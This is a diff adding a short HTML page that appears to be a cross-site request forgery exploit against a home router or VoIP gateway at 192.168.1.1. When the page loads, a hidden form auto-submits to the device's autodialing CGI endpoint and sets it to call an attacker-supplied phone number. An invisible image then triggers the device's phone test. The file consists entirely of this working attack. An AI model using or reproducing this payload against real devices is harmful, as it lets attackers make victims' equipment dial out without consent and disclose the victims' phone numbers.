@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+
+<!-- Phone number disclosure, reflected call exploit -->
+
+<html>
+
+<iframe style="display:none" id="csrf-frame-invisible" name="csrf-frame-invisible"></iframe>
+<form style="display:none" method='POST' action='http://192.168.1.1/cgi-bin/autodialing.exe' target="csrf-frame-invisible" name="csrf-form-invisible" id="csrf-form-invisible">
+  <input type='hidden' name='autodialing_enable' value='1'>
+  <input type='hidden' name='autodialing_number' value='5550150'> <!-- attacker's phone number goes here -->
+  <input type='hidden' name='autodialing_timeout' value='0'>
+  <input type='submit' value='Submit'>
+</form>
+
+<script>document.getElementById("csrf-form-invisible").submit()</script>
+
+<img src="http://192.168.1.1/cgi-bin/phone_test.exe" width="0" height="0" border="0">
+
+</html>
